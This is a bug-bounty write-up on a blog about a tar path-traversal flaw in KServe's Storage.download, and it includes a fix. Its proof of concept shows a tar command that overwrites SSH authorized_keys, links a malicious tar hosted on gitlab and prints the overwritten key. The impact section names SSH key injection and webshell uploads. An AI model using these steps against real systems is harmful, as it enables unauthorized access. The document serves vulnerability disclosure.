<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Huntr: Arbitrary File Overwrite in Kserve Storage.download(Informative) | sunriseXu’s bug hunting journey</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Huntr: Arbitrary File Overwrite in Kserve Storage.download(Informative)" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Name" />
<meta property="og:description" content="Name" />
<link rel="canonical" href="http://0.0.0.0:4000/file-overwrite/2024/05/26/arbitrary-file-overwrite-in-kserve.html" />
<meta property="og:url" content="http://0.0.0.0:4000/file-overwrite/2024/05/26/arbitrary-file-overwrite-in-kserve.html" />
<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-05-26T10:31:06+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Huntr: Arbitrary File Overwrite in Kserve Storage.download(Informative)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-05-26T10:31:06+08:00","datePublished":"2024-05-26T10:31:06+08:00","description":"Name","headline":"Huntr: Arbitrary File Overwrite in Kserve Storage.download(Informative)","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/file-overwrite/2024/05/26/arbitrary-file-overwrite-in-kserve.html"},"url":"http://0.0.0.0:4000/file-overwrite/2024/05/26/arbitrary-file-overwrite-in-kserve.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Huntr: Arbitrary File Overwrite in Kserve Storage.download(Informative)</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2024-05-26T10:31:06+08:00" itemprop="datePublished">May 26, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <h2 id="name">Name</h2>

<blockquote>
  <p>Huntr: Arbitrary File Overwrite in Kserve Storage.download API</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>0.12.1</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The Kserve python SDK provide extra <a href="https://github.com/kserve/kserve/tree/master/python/kserve#pip-install"><code class="language-plaintext highlighter-rouge">Storage</code></a> module to download model from <a href="https://github.com/kserve/kserve/tree/master/python/kserve#kserve-python-server"><code class="language-plaintext highlighter-rouge">storage providers</code></a>. The <a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L63"><code class="language-plaintext highlighter-rouge">Storage.download</code></a> is called to download and extract the model to file system. However, the function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file.</p>

<p>Using above python sdk, a victim may download model from internet. Fisrt, <a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L63"><code class="language-plaintext highlighter-rouge">Storage.download</code></a> calls <a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L695"><code class="language-plaintext highlighter-rouge">Storage._download_from_uri</code></a> to handle url download, and <code class="language-plaintext highlighter-rouge">Storage._download_from_uri</code> calls <a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L710"><code class="language-plaintext highlighter-rouge">Storage._unpack_archive_file</code></a> to extract the tarball model file.</p>

<p>The <a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L63"><code class="language-plaintext highlighter-rouge">Storage.download</code></a> function:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@staticmethod
def download(uri: str, out_dir: str = None) -&gt; str:
    ...
    if uri.startswith(_GCS_PREFIX):
        Storage._download_gcs(uri, out_dir)
    elif uri.startswith(_S3_PREFIX):
        Storage._download_s3(uri, out_dir)
    elif uri.startswith(_HDFS_PREFIX) or uri.startswith(_WEBHDFS_PREFIX):
        Storage._download_hdfs(uri, out_dir)
    elif re.search(_AZURE_BLOB_RE, uri):
        Storage._download_azure_blob(uri, out_dir)
    elif re.search(_AZURE_FILE_RE, uri):
        Storage._download_azure_file_share(uri, out_dir)
    elif is_local:
        return Storage._download_local(uri, out_dir)
    elif re.search(_URI_RE, uri):
        return Storage._download_from_uri(uri, out_dir)
</code></pre></div></div>

<p>The <a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L624"><code class="language-plaintext highlighter-rouge">_download_from_uri</code></a> function:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@staticmethod
def _download_from_uri(uri, out_dir=None):
    url = urlparse(uri)
    ...
    local_path = os.path.join(out_dir, filename)

    with requests.get(uri, stream=True, headers=headers) as response:
        ...
        if encoding == "gzip":
            stream = gzip.GzipFile(fileobj=response.raw)
            local_path = os.path.join(out_dir, f"{filename}.tar")
        else:
            stream = response.raw
        with open(local_path, "wb") as out:
            shutil.copyfileobj(stream, out)

    if mimetype in ["application/x-tar", "application/zip"]:
        Storage._unpack_archive_file(local_path, mimetype, out_dir)
</code></pre></div></div>

<p>The <a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L700"><code class="language-plaintext highlighter-rouge">_unpack_archive_file</code></a> function extracts tarball without sanitization:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@staticmethod
def _unpack_archive_file(file_path, mimetype, target_dir=None):
    if not target_dir:
        target_dir = os.path.dirname(file_path)

    try:
        logger.info("Unpacking: %s", file_path)
        if mimetype == "application/x-tar":
            archive = tarfile.open(file_path, "r", encoding="utf-8")
        else:
            archive = zipfile.ZipFile(file_path, "r")
        archive.extractall(target_dir)
        archive.close()
</code></pre></div></div>

<p>The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
It is possible that files are created outside of path, 
e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>An attacker can create a malicous tar file using following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys
</code></pre></div></div>

<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar</code> to public server.</p>

<p>I have uploaded one malicous tar file to gitlab for testing: <a href="https://gitlab.com/1159309551xcz/lfs/-/raw/main/hack.tar?ref_type=heads">https://gitlab.com/1159309551xcz/lfs/-/raw/main/hack.tar?ref_type=heads</a></p>

<p>If anyone now downloads tar using <code class="language-plaintext highlighter-rouge">Storage.download</code> api, causing automatically extracting the malicous tar file and overwrite files silently.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from kserve.storage import Storage
Storage.download("https://gitlab.com/1159309551xcz/lfs/-/raw/main/hack.tar?ref_type=heads")
</code></pre></div></div>
<p>We can check the paylod <code class="language-plaintext highlighter-rouge">authorized_keys</code> has been overwriten.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
</code></pre></div></div>

<p>Tested on Google Colab: <a href="https://colab.research.google.com/drive/1zwUsMUbTlDqGJdtLrhIo22HCkgzhQAes?usp=sharing">https://colab.research.google.com/drive/1zwUsMUbTlDqGJdtLrhIo22HCkgzhQAes?usp=sharing</a></p>

<p><img src="https://live.staticflickr.com/65535/53746993646_c00cf1cf03_o_d.png" alt="poc" /></p>

<h2 id="fix">Fix</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@staticmethod
def _unpack_archive_file(file_path, mimetype, target_dir=None):
    # See: https://docs.python.org/3/library/tarfile.html#extraction-filters
    def extraction_filter(member, path):
        """Run tarfile.tar_filter, but raise the expected ValueError"""
        # This is only called if the current Python has tarfile filters
        try:
            return tarfile.tar_filter(member, path)
        except tarfile.FilterError as exc:
            raise ValueError(str(exc))

    if not target_dir:
        target_dir = os.path.dirname(file_path)

    try:
        logger.info("Unpacking: %s", file_path)
        if mimetype == "application/x-tar":
            archive = tarfile.open(file_path, "r", encoding="utf-8")
        else:
            archive = zipfile.ZipFile(file_path, "r")
        archive.extraction_filter = extraction_filter
        archive.extractall(target_dir)
        archive.close()

</code></pre></div></div>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<h3 id="ssh-access">SSH Access</h3>

<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<h3 id="web-servers">Web Servers</h3>

<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L710">https://github.com/kserve/kserve/blob/4841328f51df6b4a18cd451355d5ccf7d9dd72d0/python/kserve/kserve/storage/storage.py#L710</a></p>

  </div><a class="u-url" href="/file-overwrite/2024/05/26/arbitrary-file-overwrite-in-kserve.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
